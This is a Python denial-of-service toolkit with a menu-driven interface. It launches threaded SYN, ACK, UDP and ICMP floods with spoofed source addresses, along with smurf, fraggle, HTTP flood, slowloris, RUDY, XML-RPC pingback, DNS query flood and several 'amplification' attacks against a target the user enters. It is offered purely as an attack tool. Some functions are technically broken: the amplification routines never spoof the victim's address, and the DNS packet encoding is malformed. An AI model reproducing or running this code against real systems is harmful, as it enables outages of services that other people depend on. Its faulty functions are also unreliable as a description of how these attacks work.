import random
import os
import sys
import socket
import time
import threading
import requests

from scapy.all import IP, TCP, UDP, ICMP, send

# ---------------------------------------------------
# SYN Flood
# ---------------------------------------------------
def syn_flood():
    banner = """
SYN FLOOD
---------

[::] Attack type: Syn flooding
[::] Status: active
"""
    print(banner)
    target_ip = input("[**] Enter target IP address: ")
    target_port = int(input("[**] Enter target port: "))

    def flood():
        while True:
            src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            ip_packet = IP(src=src_ip, dst=target_ip)
            tcp_packet = TCP(sport=src_port, dport=target_port, flags="S")
            send(ip_packet/tcp_packet, verbose=False)

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] SYN Flood attack started :: threads: {num_threads} server: {target_ip}:{target_port}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped. ")

# ---------------------------------------------------
# UDP Flood
# ---------------------------------------------------
def udp_flood():
    banner = """
UDP FLOOD
---------

[::] Attack type: UDP flooding
[::] Status: active
"""
    print(banner)
    target_ip = input("[**] Enter target IP address: ")
    target_port = int(input("[**] Enter target port: "))

    def flood():
        while True:
            src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            ip_packet = IP(src=src_ip, dst=target_ip)
            udp_packet = UDP(sport=src_port, dport=target_port) / os.urandom(1024)
            send(ip_packet/udp_packet, verbose=False)

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] UDP Flood attack started :: threads: {num_threads} server: {target_ip}:{target_port}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped. ")

# ---------------------------------------------------
# ACK Flood
# ---------------------------------------------------
def ack_flood():
    banner = """
ACK FLOOD
---------

[::] Attack type: ACK flooding
[::] Status: active
"""
    print(banner)
    target_ip = input("[**] Enter target IP address: ")
    target_port = int(input("[**] Enter target port: "))

    def flood():
        while True:
            src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            ip_packet = IP(src=src_ip, dst=target_ip)
            tcp_packet = TCP(sport=src_port, dport=target_port, flags="A")
            send(ip_packet/tcp_packet, verbose=False)

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] ACK Flood attack started :: threads: {num_threads} server: {target_ip}:{target_port}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped. ")

# ---------------------------------------------------
# ICMP Flood
# ---------------------------------------------------
def icmp_flood():
    banner = """
ICMP FLOOD
----------

[::] Attack type: ICMP flooding
[::] Status: active
"""
    print(banner)
    target_ip = input("[**] Enter target IP address: ")

    def flood():
        while True:
            src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            ip_packet = IP(src=src_ip, dst=target_ip)
            icmp_packet = ICMP() / os.urandom(1024)  
            send(ip_packet/icmp_packet, verbose=False)

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] ICMP Flood attack started :: threads: {num_threads} server: {target_ip}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[--] Attack stopped.\n")

# ---------------------------------------------------
# SMURF Attack
# ---------------------------------------------------
def smurf_attack():
    banner = """
SMURF ATTACK
------------

[::] Attack type: Smurf flooding
[::] Status: active
"""
    print(banner)
    target_ip = input("[**] Enter target broadcast IP address (e.g., 192.168.1.255): ")

    def flood():
        while True:
            src_ip = target_ip  
            ip_packet = IP(src=src_ip, dst=target_ip)
            icmp_packet = ICMP() / os.urandom(1024)  
            send(ip_packet/icmp_packet, verbose=False)

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] SMURF Attack started :: threads: {num_threads} broadcast: {target_ip}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped. ")

# ---------------------------------------------------
# Fraggle Flooding Attack
# ---------------------------------------------------
def fraggle_flooding_attack():
    banner = """
Fraggle Flooding Attack
------------------------

[::] Attack type: Fraggle Flooding
[::] Status: Active
"""
    print(banner)
    target_ip = input("[**] Enter the target IP address: ")
    target_port = 7  
    victim_ip = input("[**] Enter the victim's IP (should be a device supporting UDP Echo): ")

    def attack():
        while True:
           
            data = random._urandom(1024)  

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.sendto(data, (victim_ip, target_port)) 
                print(f"[++] Fraggle query sent to {victim_ip}, amplifying to {target_ip}")
            except Exception as e:
                print(f"[--] Error: {e}")

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] Fraggle Flooding attack started :: threads: {num_threads} target: {target_ip}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped.")

def http_flood():
    banner = """
HTTP FLOOD
----------

[::] Attack type: HTTP flooding
[::] Status: active
"""
    print(banner)
    target_url = input("[**] Enter target URL (e.g., http://example.com): ")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
    }

    def flood():
        while True:
            try:
                random_param = random.randint(1, 100000)  
                response = requests.get(f"{target_url}?param={random_param}", headers=headers, timeout=5)
                print(f"[++] Sent request - Status: {response.status_code}")
            except requests.exceptions.RequestException:
                print("[--] Request failed")

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] HTTP Flood attack started :: threads: {num_threads} target: {target_url}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped. ")

def slowloris():

    banner = """
SLOWLORIS ATTACK
-----------------

[::] Attack type: Slowloris
[::] Status: active
"""
    print(banner)
    target_ip = input("[**] Enter target IP address: ")
    target_port = int(input("[**] Enter target port (e.g., 80): "))
    num_sockets = int(input("[**] How many sockets do you want to use? "))

    sockets = []

    print("[++] Creating sockets...")
    for _ in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode('utf-8'))
            s.send("Host: {}\r\n".format(target_ip).encode('utf-8'))
            sockets.append(s)
        except socket.error:
            print("[--] Failed to create socket.")
            break

    print(f"[++] Sockets created: {len(sockets)}")
    print(f"[++] Slowloris attack started on {target_ip}:{target_port}")
    print(f"[++] Press CTRL + C to stop\n")


    try:
        while True:
            print("[++] Sending keep-alive headers...")
            for s in sockets:
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
                except socket.error:
                    sockets.remove(s)

            for _ in range(num_sockets - len(sockets)):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode('utf-8'))
                    s.send("Host: {}\r\n".format(target_ip).encode('utf-8'))
                    sockets.append(s)
                except socket.error:
                    print("[--] Failed to recreate socket.")
            
            time.sleep(15)
    except KeyboardInterrupt:
        print("[--] Attack stopped.")

# ---------------------------------------------------
# Main Menu
# ---------------------------------------------------

def rudy():
    banner = """
R-U-DEAD-YET (RUDY)
-------------------

[::] Attack type: R-U-Dead-Yet (RUDY)
[::] Status: active
"""
    print(banner)
    target_ip = input("[**] Enter target IP address: ")
    target_port = int(input("[**] Enter target port (e.g., 80): "))
    target_path = input("[**] Enter target URL path (e.g., /login): ")
    num_threads = int(input("[**] How many threads do you want to use? "))

    def flood():
        while True:
            try:
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                
                payload = f"POST {target_path} HTTP/1.1\r\n"
                payload += f"Host: {target_ip}\r\n"
                payload += "Content-Length: 1000000\r\n" 
                payload += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                
                s.send(payload.encode('utf-8'))
                
                for _ in range(1000000):  
                    s.send("a".encode('utf-8'))
                    time.sleep(0.1)  
                    
            except socket.error:
                s.close()

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] RUDY attack started :: threads: {num_threads} server: {target_ip}:{target_port}")
    print(f"[++] Target path: {target_path}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped.")

# ---------------------------------------------------
# XML-RPC Pingback Attack
# ---------------------------------------------------

def xmlrpc_pingback_attack():
    banner = """
XML-RPC Pingback Attack
-----------------------

[::] Attack type: XML-RPC Pingback
[::] Status: Active
"""
    print(banner)
    target_url = input("[**] Enter target URL (e.g., http://victim.com/xmlrpc.php): ")
    target_pingback_url = input("[**] Enter the pingback URL (e.g., http://attacker.com/pingback): ")

    def attack():
        while True:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
            }
  
            data = f"""
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>{target_pingback_url}</string></value></param>
    <param><value><string>{target_url}</string></value></param>
  </params>
</methodCall>
"""
            try:
                response = requests.post(target_url, data=data, headers=headers)
                if response.status_code == 200:
                    print("[++] Pingback request sent successfully")
                else:
                    print(f"[--] Failed to send pingback: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"[--] Error: {e}")

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] XML-RPC Pingback attack started :: threads: {num_threads} target: {target_url}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped. ")

# ---------------------------------------------------
# DNS Query Flood
# ---------------------------------------------------
def dns_query_flood():
    banner = """
DNS Query Flood Attack
----------------------

[::] Attack type: DNS Query Flood
[::] Status: Active
"""
    print(banner)
    target_ip = input("[**] Enter the target DNS server IP: ")
    target_port = 53 
    domain_name = input("[**] Enter a domain name to query (e.g., victim.com): ")

    def attack():
        while True:

            query_id = random.randint(1, 65535)
            payload = f"{domain_name}"

            packet = (
                b'\x00\x00'  
                + b'\x01\x00' 
                + b'\x00\x01'  
                + b'\x00\x00'  
                + b'\x00\x00'  
                + b'\x00\x00' 
                + b'\x03' + bytes([len(part) for part in payload.split('.')]) + b''.join(part.encode() for part in payload.split('.')) + b'\x00'
                + b'\x00\x01' 
                + b'\x00\x01' 
            )

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.sendto(packet, (target_ip, target_port))
                print("[++] DNS query sent")
            except Exception as e:
                print(f"[--] Error: {e}")

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] DNS Query Flood attack started :: threads: {num_threads} target: {target_ip}:{target_port}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped.")

# ---------------------------------------------------
# DNS Amplification Attack
# ---------------------------------------------------
def dns_amplification_attack():
    banner = """
DNS Amplification Attack
-------------------------

[::] Attack type: DNS Amplification
[::] Status: Active
"""
    print(banner)
    target_ip = input("[**] Enter the target IP address: ")
    target_port = 53  
    dns_server_ip = input("[**] Enter the DNS server IP (should be an open resolver): ")
    domain_name = input("[**] Enter a domain name for the query (e.g., victim.com): ")

    def attack():
        while True:
          
            query_id = random.randint(1, 65535)
            payload = f"{domain_name}"

            packet = (
                b'\x00\x00' 
                + b'\x01\x00'  
                + b'\x00\x01'  
                + b'\x00\x00'  
                + b'\x00\x00'  
                + b'\x00\x00'  
                + b'\x03' + bytes([len(part) for part in payload.split('.')]) + b''.join(part.encode() for part in payload.split('.')) + b'\x00'
                + b'\x00\x01' 
                + b'\x00\x01'  
            )

            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.sendto(packet, (dns_server_ip, target_port))
                print(f"[++] DNS query sent to {dns_server_ip}, amplifying to {target_ip}")
            except Exception as e:
                print(f"[--] Error: {e}")

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] DNS Amplification attack started :: threads: {num_threads} target: {target_ip}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped.")


# ---------------------------------------------------
# NTP Amplification Attack
# ---------------------------------------------------
def ntp_amplification_attack():
    banner = """
NTP Amplification Attack
-------------------------

[::] Attack type: NTP Amplification
[::] Status: Active
"""
    print(banner)
    target_ip = input("[**] Enter the target IP address: ")
    target_port = 123  
    ntp_server_ip = input("[**] Enter the NTP server IP (should be an open resolver): ")

    def attack():
        while True:
          
            packet = (
                b'\x17\x00\x03\x2a' 
                + b'\x00\x00\x00\x00'  
                + b'\x00\x00\x00\x00' 
                + b'\x00\x00\x00\x00'  
                + b'\x00\x00\x00\x00'  
                + b'\x00\x00\x00\x00' 
                + b'\x00\x00\x00\x00'  
                + b'\x00\x00\x00\x00'  
            )

            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.sendto(packet, (ntp_server_ip, target_port))
                print(f"[++] NTP query sent to {ntp_server_ip}, amplifying to {target_ip}")
            except Exception as e:
                print(f"[--] Error: {e}")

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] NTP Amplification attack started :: threads: {num_threads} target: {target_ip}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped.")

# ---------------------------------------------------
# Memcached Amplification Attack
# ---------------------------------------------------
def memcached_amplification_attack():
    banner = """
Memcached Amplification Attack
------------------------------

[::] Attack type: Memcached Amplification
[::] Status: Active
"""
    print(banner)
    target_ip = input("[**] Enter the target IP address: ")
    target_port = 11211 
    memcached_server_ip = input("[**] Enter the Memcached server IP (should be an open resolver): ")

    def attack():
        while True:
            
            key = str(random.randint(1, 1000000)).encode('utf-8')
            data = b'GET ' + key + b'\r\n' 
            packet = data

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.sendto(packet, (memcached_server_ip, target_port))
                print(f"[++] Memcached query sent to {memcached_server_ip}, amplifying to {target_ip}")
            except Exception as e:
                print(f"[--] Error: {e}")

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] Memcached Amplification attack started :: threads: {num_threads} target: {target_ip}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped.")


# ---------------------------------------------------
# SSDP Amplification Attack
# ---------------------------------------------------
def ssdp_amplification_attack():
    banner = """
SSDP Amplification Attack
---------------------------

[::] Attack type: SSDP Amplification
[::] Status: Active
"""
    print(banner)
    target_ip = input("[**] Enter the target IP address: ")
    target_port = 1900 
    ssdp_server_ip = input("[**] Enter the SSDP server IP (should be an open SSDP device): ")

    def attack():
        while True:
          
            packet = (
                b'M-SEARCH * HTTP/1.1\r\n'
                b'ST: ssdp:all\r\n' 
                b'HOST: 239.255.255.250:1900\r\n' 
                b'MAN: "ssdp:discover"\r\n'
                b'SERVER: Python/3.8 SSDP Amplifier\r\n\r\n' 
            )

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.sendto(packet, (ssdp_server_ip, target_port))
                print(f"[++] SSDP query sent to {ssdp_server_ip}, amplifying to {target_ip}")
            except Exception as e:
                print(f"[--] Error: {e}")

    num_threads = int(input("[**] How many threads do you want to use? "))
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"\n[++] SSDP Amplification attack started :: threads: {num_threads} target: {target_ip}")
    print(f"[++] Press CTRL + C to stop\n")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[--] Attack stopped.")

def main():
    banner = r"""
              _____       _______      _______      __   _      _______      _______
 |           |     |      |______         |         | \  |      |______         |   
 |_____      |_____|      |______         |         |  \_|      |______         |   
                                                                                  



                  .-'-._
                 /    e<
             _.-''';  (
   _______.-''-._.-'  / 
   ====---:_''-'     /  _  _     %%%%
            '-=. .-'` _(_)(_)   %%|/%%%
              _|_\_  (_)(_)(_) %%%%%%%%%%
             //\\//\\//\\//\\//\\%/_%%%%%%%
         ____\\//\\//\\//\\//\\// |__|/__%%%
________(___  \\/\//\\//\\//\\//__//___%%%%%%%
          / \  \_/ __ \___//------\--%%%%%%%
_________/   \____/  \____/\\%%%%%%%%%%%%
                            \_-%%%%%%%%        A N E Z A T R A
 
 | ** LAYER (3/4)
 | ** LAYER 7

 | ** POWERFUL DoS TOOL KIT 
  __________________________________________________________________________

                              (2000 - 2024)

This program provides a wide range of attack possibilities, covering all DoS methods.
  __________________________________________________________________________

  --- SELECT FLOODING TYPE ---

----------------------------------------------------------------------------------------------------------------------------------
| Network Layer DoS Attacks (Layer 3/4)      | Application Layer DoS Attacks (Layer 7)   | Reflection and Amplification Attacks  |
----------------------------------------------------------------------------------------------------------------------------------
| [A1]: SYN FLOOD                            | [A2]: HTTP FLOOD                          | [A3]: DNS AMPLIFICATION               |
| [B1]: ACK FLOOD                            | [B2]: SLOWLORIS                           | [B3]: NTP AMPLIFICATION               |
| [C1]: UDP FLOOD                            | [C2]: RUDY (R-U-Dead-Yet)                 | [C3]: MEMCACHE AMPLIFICATION          |
| [D1]: ICMP FLOOD                           | [D2]: XML-RPC Pingback Attack             | [D3]: SSDP AMPLIFICATION              |
| [E1]: SMURF ATTACK                         | [E2]: DNS Query Flood                     |                                       |      
| [F1]: FRAGGLE ATTACK                       |                                           |                                       |
----------------------------------------------------------------------------------------------------------------------------------
"""
    print(banner)
    while True:
        choose = input("LOETNET > ").strip().upper()

        if choose == "A1":
            syn_flood()
        elif choose == "B1":
            ack_flood()
        elif choose == "C1":
            udp_flood()
        elif choose == "D1":
            icmp_flood()
        elif choose == "E1":
            smurf_attack()
        elif choose == "F1":
            fraggle_flooding_attack()
        elif choose == "A2":
            http_flood()
        elif choose == "B2":
            slowloris()
        elif choose == "C2":
            rudy()
        elif choose == "D2":
            xmlrpc_pingback_attack()
        elif choose == "E2":
            dns_query_flood()
        elif choose == "A3":
            dns_amplification_attack()
        elif choose == "B3":
            ntp_amplification_attack()
        elif choose == "C3":
            memcached_amplification_attack()
        elif choose == "D3":
            ssdp_amplification_attack()

        else:
            print("\n[--] Please select a valid DoS type.\n")

if __name__ == "__main__":
    main()
